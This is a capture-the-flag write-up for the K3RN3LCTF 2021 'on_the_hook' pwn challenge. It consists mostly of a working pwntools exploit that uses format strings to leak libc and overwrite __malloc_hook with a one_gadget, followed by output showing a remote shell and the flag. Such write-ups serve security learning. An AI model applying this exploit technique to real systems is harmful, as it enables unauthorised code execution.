# K3RN3LCTF 2021 

## on\_the\_hook

> Captain Malloc lost his hook find it and than grab a shell for your effort.
> 
> `nc ctf.k3rn3l4rmy.com 2201`
>
> Author: Bex
> 
> [`on_the_hook`](on_the_hook) [`libc.so.6`](libc.so.6)

Tags: _pwn_ _x86_ _malloc_ _malloc-hook_ _write-what-where_ _format-string_


## Summary

I'm not interested in writing a lengthly write up since this is just a ripoff of a challenge from other CTFs (seen it, done it).

Read [this](https://github.com/datajerk/ctf-write-ups/tree/master/dctf2021/formats_last_theorem) for details on how this exploit works.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./on_the_hook')

if args.REMOTE:
    p = remote('ctf.k3rn3l4rmy.com', 2201)
    libc = ELF('./libc.so.6')
    __libc_start_main_offset = 247
    libc.symbols['gadget'] = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6][2]
else:
    p = process(binary.path)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    __libc_start_main_offset = 245
    libc.symbols['gadget'] = [0xcdc4b,0x1487fb,0x1487fc][2]

offset = 7

p.sendlineafter(b':\n',b'%27$010p')
libc.address = int(p.recvline().strip(),16) - libc.sym.__libc_start_main - __libc_start_main_offset
log.info('libc.address: {x}'.format(x = hex(libc.address)))

payload = fmtstr_payload(offset,{libc.sym.__malloc_hook:libc.sym.gadget},write_size='short')
assert(len(payload) < 0x40)
assert(payload.find(b'\n') == -1)

p.sendline(payload)
p.recvuntil(b'\n')
p.sendline(b'%65536c')
p.interactive()
```

Basically leak libc with format string, then use second format string as write-what-where to write out a malloc hook with a one\_gadget, then use a third format string to malloc a buffer, thus trigging a malloc.

The `assert` statements catch if the length is greater than the `fgets` buffer and if the attack has a newline since `fgets` will terminate early.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/k3rn3lctf2021/on_the_hook/on_the_hook'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2201: Done
[*] '/pwd/datajerk/k3rn3lctf2021/on_the_hook/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0xf7df5000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ cat flag.txt
flag{m4l1oc_h0ok_4nd_0n3_g4d9et_3a5y_a5_7h4t}
```
